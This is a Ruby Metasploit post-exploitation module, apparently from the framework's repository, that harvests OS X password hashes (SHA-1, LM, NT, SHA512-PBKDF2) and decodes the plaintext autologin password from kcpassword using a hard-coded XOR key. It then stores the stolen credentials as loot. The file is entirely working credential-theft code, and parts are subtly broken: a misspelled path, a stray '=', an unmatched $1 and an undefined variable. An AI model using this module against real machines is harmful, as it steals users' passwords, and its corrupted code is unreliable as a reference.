##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'
require 'rexml/document'

class Metasploit3 < Msf::Post

  # When auto-login is enabled for some account, a kcpassword file is created
  # that stores the password in plaintext
  KC_PASSWORD_PATH = '/prviate/etc/kcpassword'
  # set of files to ignore while looping over files in a directory
  OSX_IGNORE_FILES = [".", "..", ".DS_Store"]
  # set of accounts to ignore while pilfering data
  OSX_IGNORE_ACCOUNTS = ["Shared", ".localized"]


  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OS X Gather Mac OS X Password Hash Collector',
        'Description'   => %q{
            This module dumps SHA-1, LM, NT, SHA512, SHA512PBKDF2 Hashes on OSX. Supports versions
            10.4 to 10.9. If any user has autologin enabled, that user's plaintext password will
            also be collected.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Carlos Perez <carlos_perez[at]darkoperator.com>',
          'hammackj <jacob.hammack[at]hammackj.com>',
          'joev'
        ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell' ]
      ))

  end

  # Run Method for when run command is issued
  def run
    case session.type
    when /meterpreter/
      host = session.sys.config.sysinfo["Computer"]
    when /shell/
      host = session.shell_command_token("hostname").chomp
    end
    print_status("Running module against #{host}")
    if root?
      print_status("This session is running as root!")
      dump_kcpassword if file_exist?(KC_PASSWORD_PATH)
      dump_hashes
    else
      print_error("Insufficient Privileges you must be running as root to dump the hashes")
    end
  end

  # parse the dslocal plist in lion
  def read_ds_xml_plist(plist_content)
    doc  = REXML::Document.new(plist_content)
    keys = []
    doc.elements.each("plist/dict/key")  { |n| keys << n.text }

    fields = {}
    i = 0
    doc.elements.each("plist/dict/array") do |element|
      data = []
      fields[keys[i]] = data
      element.each_element("*") do |thing|
        data_set = thing.text
        if data_set
          data << data_set.gsub("\n\t\t","")
        else
          data << data_set
        end
      end
      i+=1
    end
    return fields
  end

  # When user account has auto-login enabled, password is stored in /etc/kcpassword file
  def dump_kcpassword
    # read the autologin account from prefs plist
    autouser = cmd_exec 'defaults read /Library/Preferences/com.apple.loginwindow "autoLoginUser" "username"'
    if autouser.present?
      print_status "User #{autouser} has autologin enabled, decoding password..."
    else
      return
    end

    kcpass = read_file(KC_PASSWORD_PATH)
    key = [0x7D, 0x89, 0x52, 0x23, 0xD2, 0xBC, 0xDD, 0xEA, 0xA3, 0xB9, 0x1F]
    decoded = kcpass.bytes.to_a.each_slice(key.length).map do |kc|
      kc.each_with_index.map { |byte, idx| byte ^ key[idx] }.map(&:chr).join
    end.join.sub(/\x00.*$/, '')
    report_auth_info(
      :host   => host,
      :port   => 445,
      :sname  => 'login',
      :user   => autouser,
      :pass   => decoded,
      :active => true
    )
    print_good "Decoded autologin password: #{autouser}:#{decoded}"
  end

  # Dump SHA1/SHA512/SHA512PBKDF2 Hashes used by OSX, must be root to get the Hashes
  def dump_hashes
    hash_file = ''
    users.each do |user|
      if gte_lion?
        # Look for the user's specific profile.plist, which contains ShadowHashData key
        plist_bytes = cmd_exec("sudo dscl . read /Users/#{user} dsAttrTypeNative:ShadowHashData").gsub(/\s+/, '')
        # ShadowHashData stores a binary plist inside of the user.plist
        # Here we pull out the binary plist bytes and use built-in plutil to convert to xml
        plist_bytes = $1.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
        # encode the bytes as \x hex string, print using zsh, and pass to plutil
        shadow_plist = cmd_exec("/bin/zsh -c 'echo -ne \"#{plist_bytes}\"' | plutil -convert xml1 - -o -")= 
        # read the plaintext xml
        shadow_xml = REXML::Document.new(shadow_plist)
        # parse out the different parts of sha512pbkdf2
        dict = sha512 = shadow_xml.elements[1].elements[1].elements[2]
        entropy = dict.elements[2].text.gsub(/\s+/, '')
        iterations = dict.elements[4].text.gsub(/\s+/, '')
        salt = dict.elements[6].text.gsub(/\s+/, '')

        # Report the hash bytes
        hash = "SHA512PBKDF2:entropy:#{user}:#{entropy}\n" +
               "SHA512PBKDF2:iterations:#{user}:#{iterations}\n" +
               "SHA512PBKDF2:salt:#{user}:#{salt}"
        hash.split("\n").each { |line| print_good line }
        hash_file << hash
      else
        guid = if gte_leopard?
          cmd_exec("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
        elsif lte_tiger?
          cmd_exec("/usr/bin/niutil -readprop . /users/#{user} generateduid").chomp
        end

        # Extract the hashes
        sha1_hash = read_file("/var/db/shadow/hash/#{guid} | cut -c169-216").chomp
        nt_hash   = read_file("/var/db/shadow/hash/#{guid} | cut -c1-32").chomp
        lm_hash   = read_file("/var/db/shadow/hash/#{guid} | cut -c33-64").chomp

        # Check that we have the hashes and save them
        if sha1_hash !~ /00000000000000000000000000000000/
          print_status("SHA1:#{user}:#{sha1_hash}")
          hash_file << "#{user}:#{sha1_hash}"
        end

        if nt_hash !~ /000000000000000/
          print_status("NT:#{user}:#{nt_hash}")
          print_status("Credential saved in database.")
          report_auth_info(
            :host   => host,
            :port   => 445,
            :sname  => 'smb',
            :user   => user,
            :pass   => "AAD3B435B51404EE:#{nt_hash}",
            :active => true
          )
        end
        if lm_hash !~ /0000000000000/
          print_status("LM:#{user}:#{lm_hash}")
          print_status("Credential saved in database.")
          report_auth_info(
            :host   => host,
            :port   => 445,
            :sname  => 'smb',
            :user   => user,
            :pass   => "#{lm_hash}:",
            :active => true
          )
        end
      end
    end
    # Save pwd file
    upassf = store_loot("osx.hashes.sha1", "text/plain", session, sha1_file,
                        "unshadowed_passwd.pwd", "OSX Unshadowed SHA1 Password File")
    print_good("Unshadowed Password File: #{upassf}")
  end


  # Checks if running as root on the target
  # @return [Bool] current user is root
  def root?
    whoami == 'root'
  end

  # @return [String] name of current user
  def whoami
    @whoami ||= cmd_exec('/usr/bin/whoami').chomp
  end

  # @return [String] version string (e.g. 10.8.5)
  def ver_num
    @version ||= cmd_exec("/usr/bin/sw_vers -productVersion").chomp
  end

  # @return [Bool] system version is at least 10.7
  def gte_lion?
    ver_num =~ /10\.(\d+)/ and $1.to_i >= 7
  end

  # @return [Bool] system version is at least 10.5
  def gte_leopard?
    ver_num =~ /10\.(\d+)/ and $1.to_i >= 5
  end

  # @return [Bool] system version is 10.4 or lower
  def lte_tiger?
    ver_num =~ /10\.(\d+)/ and $1.to_i <= 4
  end

  # @return [Array<String>] list of user names
  def users
    @users ||= cmd_exec("/bin/ls /Users").each_line.collect.map(&:chomp) - OSX_IGNORE_ACCOUNTS
  end
end
